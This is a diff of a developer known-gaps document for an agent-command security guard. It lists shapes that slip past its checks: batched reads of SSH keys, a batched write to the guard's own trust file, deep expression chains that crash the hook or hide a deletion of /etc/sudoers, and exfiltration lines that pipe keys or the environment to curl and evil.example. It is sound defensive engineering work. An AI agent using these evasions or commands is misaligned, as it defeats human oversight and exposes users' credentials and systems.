@@ -121,23 +121,9 @@ Every row keeps its desired expectation, and every entry below is the engine's g
 - `secrets.gh-captured-output-echo-delegates` — engine expected-fail: desired delegate. Actual engine: Block via `secrets-env` at Full coverage. `echo "$r"` prints a value captured from `gh run list`, and `mark_disclosed_environment_reads` (`crates/effinterp-engine/src/shell/mod.rs:927`) marks every `environment.read` of the stage that produced `$r` as `output="stdout"`. That stage is the `gh` process, so the reads the `gh` model declares for its own authentication (`GH_TOKEN`, `GITHUB_TOKEN`) are reported as disclosed, although `gh run list` never prints them. Only the shell's own parameter expansions reach the builtin's output; a producing program's internal reads should keep their plain `environment.read`. The same over-block hits any captured output of a CLI whose model reads a credential variable (`x=$(gh api user); echo "$x"`), while plain `gh run list` delegates.
 - `net-lookalike-host.git-submodule-add` — engine expected-fail: desired block via `net-lookalike-host`. Actual engine: Delegate at Partial coverage; engine gap code(s): `unmodeled-subcommand`. No endpoint host is recovered: the Git model (`crates/effinterp-engine/src/models/git.rs`) models only the `submodule deinit` forms, so `submodule add <url>` emits no clone download of the URL and stops at an `unmodeled_subcommand` boundary.
 - `net-lookalike-host.git-remote-add-push` — engine expected-fail: desired block via `net-lookalike-host`. Actual engine: Delegate at Partial coverage; no engine gap code (boundary `unmodeled_hooks`). No endpoint host is recovered: the Git model's `remote_network` (`crates/effinterp-engine/src/models/git.rs`) resolves a push endpoint only from a literal URL operand, and the `git.config_write` of `git remote add origin <url>` earlier in the same call is not carried to `git push origin`, so the upload is `network.upload <network:?>`.
-- `registry-unpublish.launch-node-run-script` — engine expected-fail: desired block via `registry-unpublish`. Actual engine: Delegate at Full coverage; no engine gap code. The Node launcher classes `--run` as `inert` (`crates/effinterp-engine/models/v1/node-launcher.json:207`), so the package script it runs is never resolved and the plan is a bare `process.exec` at full coverage; `npm run retire` on the same fixture blocks. `--test` is classed inert the same way (`:216`) and reports Full where every other test runner reports Partial, but the corpus cannot express that: a `partial` expectation accepts Full. A fix resolves `--run NAME` through the package-script launch `npm run` uses, and gives `--test` a boundary for the test files it discovers.
 - `secrets-exfil.jq-embedded-env-upload` — engine expected-fail: desired block via `secrets-exfil`. Actual engine: Delegate at Full coverage; no engine gap code. The jq document sees `env` and `$ENV` only at the start of the filter (the `literal_values` conditions of the `inline-filter` mode in `crates/effinterp-engine/models/v1/tranche/transfer-archive-process/jq.json`), because a document condition can test a literal's whole value, prefix or suffix but not a token inside it; `jq -n env | curl …` blocks (`secrets-exfil.jq-env-upload`), while `[env]`, `{e: env}` and `. + $ENV` read the same environment with no effect and no boundary. A fix needs the filter read: a literal shape in `effinterp-model-schema` (matched in `crates/effinterp-engine/src/models/registry/literals.rs`) that finds the `env` and `$ENV` tokens outside jq strings and field names such as `.env`, or a jq filter reader; a filter file (`-f`) needs its file read the same way.
 - `secrets-exfil.jq-env-continuation-upload` — engine expected-fail: desired block via `secrets-exfil`. Actual engine: Delegate at Partial coverage; engine gap code(s): `unparsed-script`. A filter that starts with `env` or `$ENV` and continues (`env,.`, `env?`, `env//{}`, a newline before `| keys`) gets an `unparsed_script` boundary on the environment and no effect (the `boundaries` of the `inline-filter` mode in `crates/effinterp-engine/models/v1/tranche/transfer-archive-process/jq.json`): the document cannot tell a continuation that still prints the whole object from one that prints a single variable (`env.PATH`, which must not block: `secrets-exfil.jq-env-named-path-upload-delegates`) or only names (`env | keys`), so only the bare builtin is a whole-environment disclosure. A fix needs the same filter reader as `secrets-exfil.jq-embedded-env-upload`, which would also name the variable `env.NAME` and `$ENV.NAME` read.
 - `secrets-credentials.gtar-create-member-before-directory` — engine expected-fail: desired block via `secrets-credentials`. Actual engine: Delegate at Partial coverage; engine gap code(s): `observation-unavailable`, `descendant-scan-incomplete`. GNU tar applies `-C` to the members after it, so `credentials` here is read from `~/.aws` and only `notes.txt` from `/tmp`; the gtar document reads every relative member under the `-C` directory (the create rule with `flag_value_present` `-C` in `crates/effinterp-engine/models/v1/tranche/transfer-archive-process/gtar.json`), because a document rule sees a flag's value but not its position among the operands. The native model resolves it (the `tar` spelling blocks). Absolute members are read where they are, and a repeated `-C` is a boundary. A fix routes `gtar` to the native tar model in `crates/effinterp-engine/src/models/archive.rs`, as it is GNU tar.
-
-- `self-protection.critical.ruby-case-in-pattern-arm-state` — engine expected-fail: desired block (structural). Actual engine: Delegate at Full coverage; no gap. The Ruby walker descends through `children` (`crates/effinterp-engine/src/lang/ruby/mod.rs:4371`), which lists `Node::Case` and `Node::When` but has no `Node::CaseMatch` or `Node::InPattern` arm, so a `case … in` falls to `_ => {}` (`:4524`) and nothing inside it is visited: the arm bodies, their guards and the `else` body emit no effect and no boundary. The control-flow builder does handle `CaseMatch` (`crates/effinterp-engine/src/lang/ruby/control.rs:310`), and the `case … when` spelling and the one-line `expr in pattern` test block. `BEGIN { … }` and `END { … }` blocks (`Node::Preexe`, `Node::Postexe`) have no arm either and are dropped the same way. A fix adds the `CaseMatch` and `InPattern` children (subject, patterns, guards, bodies, `else`) and their branch conditions beside the `Case` arms.
-- `fs-system-tree.go-hex-escaped-path-remove-all` — engine expected-fail: desired block via `fs-system-tree`. Actual engine: Delegate at Partial coverage; engine gap code(s): `frontend-partial`, `resource-components-unavailable`, `access-semantics-partial`. The fixture's `escaped.go` calls `os.RemoveAll("\x2fetc")`. `unquote_go_string` (`crates/effinterp-engine/src/lang/go/summary.rs:225`) decodes only `\"`, `\n`, `\t` and `\\`, so the literal keeps its backslash text and the deletion is planned on the cwd-relative path `\x2fetc`; octal (`"\057etc"`) is left the same way, while `/` and raw strings resolve. A fix decodes every Go interpreted-string escape (`\x`, octal, `\u`, `\U`, `\a\b\f\r\v\'`) or makes the resource unresolved when it meets one it does not decode.
-- `net-lookalike-host.python-ascii-host-unicode-query-delegates` — engine expected-fail: desired delegate. Actual engine: Block via `net-lookalike-host`; engine gap code(s): `unrecoverable-source`. `SemanticValue::source_literal` (`crates/effinterp-engine/src/value.rs:224`) ends a URL's authority only at `/`, so `https://example.com?q=привет` lowers to host `example.com?q=привет`, whose last label mixes Latin and Cyrillic; a `#fragment` does the same. `https://example.com/?q=привет` delegates, as does the curl spelling (`net-lookalike-host.ascii-host-unicode-fragment-delegates`), which goes through `parse_url_endpoint`. A fix makes `source_literal` use the same authority parsing as `parse_url_endpoint`.
-- `net-lookalike-host.python-ascii-host-unicode-userinfo-delegates` — engine expected-fail: desired delegate. Actual engine: Block via `net-lookalike-host`; engine gap code(s): `unrecoverable-source`. `source_literal` never strips userinfo (`crates/effinterp-engine/src/value.rs:234`), so `https://иван:secret@example.com/feed` lowers to host `иван:secret@example.com`. curl with the same URL delegates on host `example.com`. Same fix as `net-lookalike-host.python-ascii-host-unicode-query-delegates`; the host then also stops carrying the password into the plan.
-- `exec-decoded.node-program-local-atob-eval-delegates` — engine expected-fail: desired delegate. Actual engine: Block via `exec-decoded` at Partial coverage; engine gap code(s): `unmodeled-dynamic-code`. `decodes_base64` (`crates/effinterp-engine/src/js/model.rs:1025`) excludes a program-local `atob` or `Buffer` only through `active_bodies.last()`, the body of a called function, so a function or `const` named `atob` declared at the top level of the program is still read as the base64 decoder and its `eval` as decoded execution. The same shadowing inside a function (`function f(atob) { eval(atob(…)) }`) delegates. A fix consults the module-level bindings as well.
-- `self-protection.critical.kiro-batched-fs-write-trust` — engine expected-fail: desired structural self-protection block. Actual engine: Delegate at Partial coverage; engine gap code(s): `unsupported-tool`. The row replays the call the Kiro adapter forwards for an `fs_write` with two or more operations: `single_operation_path` (`crates/nah-cli/src/kiro_adapter.rs:190`) returns no path, so the adapter keeps the native tool name and input and marks normalization complete (`crates/nah-cli/src/kiro_adapter.rs:161`), and the engine reads an unknown tool as `unsupported_tool` (`crates/effinterp-engine/src/toolcall.rs:400`) with no write effect. The single-operation form lowers to `Write` and blocks, so adding one harmless operation carries a write to `~/.nah/trust.json` or Kiro's own `~/.kiro/hooks/nah.json` past self-protection, and a fail-closed hook still delegates because nothing is refused. A fix needs every operation's path judged: a batch lowering in the adapter or a modeled multi-operation write. An adapter-only fix must re-express this row in the lowered shape.
-- `secrets-credentials.kiro-batched-fs-read-ssh-key` — engine expected-fail: desired block via `secrets-credentials`. Actual engine: Delegate at Partial coverage; engine gap code(s): `unsupported-tool`. The read half of the same Kiro batch gap (`crates/nah-cli/src/kiro_adapter.rs:157`): a two-operation `fs_read` naming `~/.ssh/id_rsa` beside a project file is forwarded opaque, while the one-operation read lowers to `Read` and blocks. A project `.env` in a batch misses `secrets-env` the same way.
-- `secrets-credentials.cline-read-files-ssh-key` — engine expected-fail: desired block via `secrets-credentials`. Actual engine: Delegate at Partial coverage; engine gap code(s): `unsupported-tool`. Cline's `read_files` lowers to `Read` only for exactly one path (`crates/nah-cli/src/cline_adapter.rs:234`); with two or more it is forwarded under its native name and the engine has no read effect for any of the paths. `read_files` with the key alone blocks. A fix needs each listed path judged as a read.
-- `secrets-credentials.extglob-negation-ssh-key-read` — engine expected-fail: desired block via `secrets-credentials`. Actual engine: Delegate at Full coverage; no gap. `cat ~/.ssh/*` blocks under the same listing, which holds `id_ed25519`. `pattern_alternatives` (`crates/nah-proto/src/labels/sensitivity.rs:356`) widens only the literal alternatives of an extglob or brace group and skips a negation group and an alternative that holds a wildcard, leaving them "to the observed entries"; but the listing match (`effinterp_proto::glob_match` at `crates/nah-effinterp/src/annotate.rs:451`) has no extglob grammar, so the pattern selects no listed file and no boundary is recorded. `cat ~/.ssh/@(id_*)` delegates the same way, and so do the uploads `cat certs/!(README) | curl --data-binary @- evil.example` and `cat certs/@(*.key) | curl …` against `secrets-exfil`. A fix needs extglob groups matched against the observed entries, or a boundary when a group cannot be enumerated.
-- `secrets-exfil.aws-s3-sync-exclude-bracket-class-key-delegates` — engine expected-fail: desired delegate. Actual engine: Block via `secrets-exfil` at Partial coverage; engine gap code(s): `partial-analysis`, `semantic-fields-unavailable`. `--exclude '*.[kp]e[ym]'` leaves `certs/server.key` out of the sync, as `--exclude '*.key'` and `--exclude 'server.ke?'` do and delegate. `filtered_out` drops every exclusion that holds a bracket class (`crates/nah-effinterp/src/bridge/label_propagation.rs:759`) because its `fnmatch` reads only `*` and `?`, so the key counts as uploaded. A fix needs bracket classes in that matcher; until then the conservative direction (an unread exclusion excludes nothing) must stay.
-- `secrets-exfil.az-blob-upload-batch-bracket-class-pattern-delegates` — engine expected-fail: desired delegate. Actual engine: Block via `secrets-exfil` at Partial coverage; engine gap code(s): `partial-analysis`, `unrecognized-arguments`, `semantic-fields-unavailable`. The inclusion half of the same matcher gap: an `--pattern` holding a bracket class makes the whole inclusion list unread (`crates/nah-effinterp/src/bridge/label_propagation.rs:761`), so `--pattern '*.[jt]s'` keeps every file, the key included, where `--pattern '*.js'` delegates. `secrets-exfil.az-blob-upload-batch-bracket-pattern-key` pins the direction that must keep blocking.
-- `fs-raw-device.windows-physical-drive-dd` — engine expected-fail: desired block via `fs-raw-device`. Actual engine: Delegate at Partial coverage; engine gap code(s): `observation-unavailable`. The guard record promises Windows `\\.\PhysicalDriveN` (`crates/nah-cli/guards/fs-raw-device.toml:7`) and `is_raw_storage_or_sysrq` recognizes the spelling (`crates/nah-proto/src/labels/raw_storage.rs:29`), but `AbsolutePath` refuses every device-namespace path (`windows_device_namespace`, `crates/nah-proto/src/ctx.rs:127`), so the write target never becomes a host path the guard's reach can label, and the engine's plan names the write `//PhysicalDrive1`, with the `\\.\` namespace folded away; a `Write` tool call to `\\.\PhysicalDrive0` delegates the same way. A fix needs the device spelling carried to the raw-storage rule without admitting device namespaces as ordinary policy paths, or the record corrected.
 
 ## Effect golden gaps
 
@@ -558,26 +544,24 @@ Accepted limitations with no corpus row that asserts a desired block.
   consulted. The guard silently never fires. No corpus row exists because the
   corpus does not load custom guards.
 
-- A JavaScript chain nested past the parser's stack — the depth pre-scan
-  (`scan_nesting` in `crates/effinterp-engine/src/lang/depth.rs`) resets its
-  statement and operator runs at every closing bracket, so right-nested
-  chains whose links each close a bracket are never counted:
-  `c ? (1) : c ? (1) : … 0`, `if (a) {} else if (b) {} else if …` and
-  `(a) => (a) => … 0`. Analysis recurses once per link, and a long
-  enough chain overflows the stack and aborts the process instead of ending
-  at the walk-depth boundary. With a debug build on macOS (8 MiB main stack),
-  `node -e 'x = ' + 'c ? (1) : ' * n + '0; require("fs").rmSync("/etc/sudoers")'`
-  delegates with the `max_walk_depth` boundary up to n = 4 345 and aborts
-  (`thread 'main' has overflowed its stack`, exit by SIGABRT) from 4 346, a
-  44 KiB command; the else-if chain aborts from n = 19 546 and the arrow
-  chain from n = 6 462. `nah test --source js` aborts the same way. The Ruby
-  equivalents (`elsif`, parenthesized ternary) end at a boundary up to
-  n = 50 000. A hook that dies this way returns no decision, so what the
+- A Ruby chain nested past the parser's stack — the depth pre-scan
+  (`scan_nesting` in `crates/effinterp-engine/src/lang/depth.rs`) cannot lex
+  Ruby strings, comments or keyword blocks, so two shapes still escape it.
+  A string that spans a line ends the operator run at the break:
+  `x = ` + `c ? "a\nb" : ` * n + `0`. And any `end` drops the whole block
+  run rather than one level: (`if a\nif a\nbegin end\n`) * n closed by
+  2n `end`. Both overflow the stack and abort the process at n = 50 000 on a
+  2 MiB thread (debug build, macOS) instead of ending at the walk-depth
+  boundary. A hook that dies this way returns no decision, so what the
   agent does next depends on the runtime's handling of a crashed hook. No
   corpus row exists because the replay would abort the corpus harness rather
-  than fail one case; a fix counts these chains in the pre-scan (or bounds
-  the parser's recursion) and adds generated cases to
-  `crates/effinterp-engine/tests/suite/robustness.rs`.
+  than fail one case. A fix needs token-accurate Ruby input (lib-ruby-parser's
+  lexer, or a parser whose recursion is bounded), not another byte heuristic.
+  The JavaScript and TypeScript scan is a byte heuristic too, but it skips
+  strings, templates, comments and regular expressions and tells a block's
+  `}` from an expression's. No chain is known to escape it;
+  `crates/effinterp-engine/tests/suite/robustness.rs` holds the generated
+  chains it must stop, and a new escaping shape belongs there.
 - A downloaded Perl module loaded by name. `curl -o p.pm URL && perl -I. -Mp
   -e 1` delegates: `-M`/`use` module imports are not resolved against `@INC`
   (boundary `Perl module import "p" is not modeled`), so the downloaded file
@@ -587,6 +571,47 @@ Accepted limitations with no corpus row that asserts a desired block.
   the Perl launcher (`-I`, `PERL5LIB`, the working directory) feeding
   `runtime_searched_source` in
   `crates/effinterp-engine/src/models/common.rs`.
+
+- Fail-closed installs when the adapter cannot run. A `--fail-closed` hook
+  blocks what `nah hook <runtime> run --fail-closed` refuses, which requires
+  Nah to respond: `docs/security.md` leaves missing binaries and runtime
+  failure outside the promise. The Droid install keeps its wrapper's exit-0
+  fallback under `--fail-closed` (`desired_droid_handler` in
+  `crates/nah-cli/src/commands/droid_installation.rs`), so a missing `nah`, or
+  one that exits with any status but 2, delegates, as `docs/runtimes/droid.md`
+  states. The OpenClaw plugin's `catch` returns `undefined` under
+  `--fail-closed` too (`openclaw_plugin_source` in
+  `crates/nah-cli/src/commands/openclaw_installation.rs`), so a child that
+  cannot start, times out, exits nonzero or prints an invalid decision
+  delegates, as `docs/runtimes/openclaw.md` states. Prime Agent's fail-closed
+  wiring blocks in each of those cases (`docs/runtimes/prime-agent.md`).
+  Decision needed: whether every runtime's fail-closed wiring denies when its
+  `nah` subprocess is missing, crashes or times out, as Prime Agent's does, or
+  whether that stays outside the promise. No installer test pins either
+  result until then.
+- A long left-associative JavaScript chain hides the statements after it —
+  the JS walker (`enter_walk` in `crates/effinterp-engine/src/js/mod.rs`)
+  marks the whole walk saturated when one expression passes depth 256, so
+  nothing after that expression is visited. `let x=1` followed by 255 or
+  more lines of `+1` and then `require('fs').rmSync('/etc/sudoers')` gives
+  delegate at partial coverage with the boundary `js walk depth bound
+  reached` and no delete; 250 lines blocks at full coverage. The depth
+  pre-scan is not the cause: it lets a one-operand-per-line chain through to
+  about 512 lines. Effects before the chain are kept. No corpus row exists
+  yet. A fix makes a depth stop skip the one expression that is too deep,
+  with its boundary, and resume at the next statement instead of saturating
+  the walk.
+- A list of comparisons whose `<` are later closed by `>` over-counts in the
+  depth pre-scan — `scan_angles` in
+  `crates/effinterp-engine/src/lang/depth.rs` reads a `<` that a later `>`
+  closes as a TypeScript type argument list, inside which commas do not end
+  the operator run. `const a=[` + `a<b,` * 130 + `c>d,` * 130 + `]` followed
+  by a delete ends at `source nesting exceeds the walk limit` and delegates
+  without the delete; 100 of each blocks at full coverage, as does the
+  alternating `a<b,c>d,` * 400. Lists of only `<`, only `>`, `<=` or `<<`
+  are unaffected, and Ruby is unaffected. No corpus row exists yet. A fix
+  needs to tell a type argument list from two comparisons, which the byte
+  scan cannot do without knowing it is reading a type.
 
 ## Audit scope
 
